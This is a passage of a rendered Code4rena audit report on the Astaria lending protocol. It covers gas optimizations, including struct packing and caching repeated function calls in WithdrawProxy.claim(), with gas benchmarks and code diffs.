4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 28 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/573\">report highlighted below</a> by <strong>c3phas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/613\">CloudX</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/608\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/562\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/540\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/522\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/507\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/446\">synackrst</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/440\">Rageur</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/432\">0xackermann</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/395\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/381\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/345\">fs0c</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/342\">caventa</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/338\">SadBase</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/257\">nogo</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/252\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/245\">shark</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/213\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/204\">0xkato</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/186\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/182\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/142\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/116\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/80\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/68\">SaeedAlipoor01988</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/28\">Bnke0x0</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/8\">Rahoz</a>.</em></p>\n<h2 id=\"overview-1\" style=\"position:relative;\"><a href=\"#overview-1\" aria-label=\"overview 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<h3 id=\"findings\" style=\"position:relative;\"><a href=\"#findings\" aria-label=\"findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Findings</h3>\n<p>NB: Some functions have been truncated where necessary to just show affected parts of the code. Through out the report some places might be denoted with audit tags to show the actual place affected.</p>\n<h3 id=\"notes-on-gas-estimates\" style=\"position:relative;\"><a href=\"#notes-on-gas-estimates\" aria-label=\"notes on gas estimates permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes on Gas Estimates</h3>\n<p>I’ve tried to give the exact amount of gas being saved from running the included tests. Whenever the function is within the test coverage, the average gas before and after will be included, and often a diff of the code after proposed changes will be given</p>\n<p>Some functions are not covered by the test cases or are internal/private functions.</p>\n<h2 id=\"g-01-pack-structs-by-putting-variables-that-can-fit-together-next-to-each-other\" style=\"position:relative;\"><a href=\"#g-01-pack-structs-by-putting-variables-that-can-fit-together-next-to-each-other\" aria-label=\"g 01 pack structs by putting variables that can fit together next to each other permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Pack structs by putting variables that can fit together next to each other</h2>\n<p>As the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas.</p>\n<h3 id=\"strategydetailsparam-version-and-vault-can-be-packed-together-gas-saved-1--2k--2k\" style=\"position:relative;\"><a href=\"#strategydetailsparam-version-and-vault-can-be-packed-together-gas-saved-1--2k--2k\" aria-label=\"strategydetailsparam version and vault can be packed together gas saved 1  2k  2k permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>StrategyDetailsParam: version and vault can be packed together: <code>Gas saved: 1 * 2k = 2k</code></h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/interfaces/IAstariaRouter.sol#L101-L105\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/interfaces/IAstariaRouter.sol#L101-L105</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"206\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StrategyDetailsParam</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">version</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"207\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/interfaces/IAstariaRouter.sol b/src/interfaces/IAstariaRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 2ae1431..679f46a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/interfaces/IAstariaRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/interfaces/IAstariaRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -100,8 +100,8 @@ interface IAstariaRouter is IPausable, IBeacon {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   struct StrategyDetailsParam {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint8 version;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 deadline;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address vault;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 deadline;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g 02 the result of a function call should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] The result of a function call should be cached rather than re-calling the function</h2>\n<h3 id=\"withdrawproxysolclaim-results-of-vault-and-asset-should-be-cached-saves-434-gas\" style=\"position:relative;\"><a href=\"#withdrawproxysolclaim-results-of-vault-and-asset-should-be-cached-saves-434-gas\" aria-label=\"withdrawproxysolclaim results of vault and asset should be cached saves 434 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WithdrawProxy.sol.claim(): Results of VAULT() and asset() should be cached (Saves 434 gas)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L240-L287\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L240-L287</a></p>\n<p><strong>Gas benchmarks</strong>\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 4651    | 15745   | 16576 | 22114 |\n| After  | 4854    | 15311   | 16073 | 21304 |</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"208\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getCurrentEpoch</span><span class=\"mtk1\">() &lt; </span><span class=\"mtk11\">CLAIMABLE_EPOCH</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PROCESS_EPOCH_NOT_COMPLETE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">decreaseYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">increaseYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">transferAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">273</span><span class=\"mtk1\">:        </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">274</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">280</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">282</span><span class=\"mtk1\">:      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">283</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalAuctionEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Claimed</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">transferAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"209\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/WithdrawProxy.sol b/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 9906ec7..abe0255 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -243,8 +243,10 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (s.finalAuctionEnd == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert InvalidState(InvalidStates.CANT_CLAIM);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _vault = VAULT();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _asset = asset();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (PublicVault(VAULT()).getCurrentEpoch() &lt; CLAIMABLE_EPOCH()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (PublicVault(_vault).getCurrentEpoch() &lt; CLAIMABLE_EPOCH()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert InvalidState(InvalidStates.PROCESS_EPOCH_NOT_COMPLETE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (block.timestamp &lt; s.finalAuctionEnd) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -252,25 +254,25 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 transferAmount = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 balance = ERC20(asset()).balanceOf(address(this)) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 balance = ERC20(_asset).balanceOf(address(this)) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       s.withdrawReserveReceived; // will never underflow because withdrawReserveReceived is always increased by the transfer amount from the PublicVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (balance &lt; s.expected) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      PublicVault(VAULT()).decreaseYIntercept(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      PublicVault(_vault).decreaseYIntercept(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      PublicVault(VAULT()).increaseYIntercept(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      PublicVault(_vault).increaseYIntercept(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span 